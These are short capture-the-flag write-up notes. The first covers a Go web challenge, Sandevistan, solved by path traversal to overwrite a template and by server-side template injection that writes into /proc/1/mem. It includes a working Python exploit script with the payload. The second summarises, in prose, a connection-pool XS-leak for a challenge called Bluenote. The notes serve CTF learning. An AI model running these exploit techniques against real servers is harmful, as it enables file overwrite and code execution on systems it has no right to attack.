## Sandevistan
Giving is a Go app and goal is to exexute /redflag in the server

You can overwrite any file using ErrorFactory through POST to /cyberware
Overwrite /tmpl/user.html to do SSTI
Run SerializedErrors to overwrite /bin/true in /proc/1/mem
Run UserHealthcheck to get the flag
```
import requests
# URL = "http://sandevistan.chal.perfect.blue:29005/"
URL = "http://localhost:1338/"

username = "user"

s = requests.session()
r = s.post(URL + "user", data={
    "username": username
})

r = s.post(URL + "cyberware", data={
    "username": "../tmpl/user.html",
    "name": '{{ .NewError "foo" "/proc/1/mem"  }} {{ .SerializeErrors "/readflag" 0 %d }} {{ .UserHealthcheck }}' % 0x93b6bb
})
r = s.get(URL + "user", params={
    "username": username
})
print(r.text)
```

ALTERNATE SOLUTION
![image](https://github.com/user-attachments/assets/a602ab0e-4322-4d83-899a-8a1c24073865)


## Bluenote
Couldnt find the actual chall but the writeups were something new i read
```
intended solution for bluenote was connection pool abuse yeah
if you block all the sockets, you can let individual blocks of requests go through if you unblock and reblock very quickly
so you block all the sockets, make your search guess, reblock quickly to let the page request through. so the search request is made, and now youre blocking the pool again 
then if your search is right, the page makes a request to dompurify, which should be blocked, and if the search is not right, there is no request 
then you make a request with lower priority than dompurify (i used script async), but higher priority than the background socket blocking fetches
then you allow one request through, if your script async went through there was nothing higher priority. if your script request did not go through, there mustve been something higher priority, meaning dompurify was loaded, meaning your search worked
```
